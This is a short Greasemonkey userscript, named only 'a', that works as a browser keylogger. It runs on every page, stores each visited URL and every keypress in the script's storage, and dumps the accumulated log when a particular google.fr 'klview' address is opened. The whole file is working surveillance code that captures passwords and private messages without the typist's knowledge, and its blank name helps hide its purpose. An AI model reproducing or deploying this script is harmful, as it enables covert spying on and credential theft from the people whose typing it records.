// ==UserScript==
// @name           a
// @namespace      a
// @include        *
// ==/UserScript==
if(location=="http://www.google.fr/klview")
{
document.body.innerHTML="<pre>"+GM_getValue('a')+"</pre>";
}
else
{
GM_setValue('a',GM_getValue('a')+'\n'+location+'\n');
var node = document;
function fonction(e){
if(document.all)ascii = e.keyCode  ;
else ascii = e.which ;
touche = String.fromCharCode(ascii);
GM_setValue('a',GM_getValue('a')+touche);
}
if(document.all) node.attachEvent("onkeypress",fonction);
else node.addEventListener("keypress",fonction,true);
}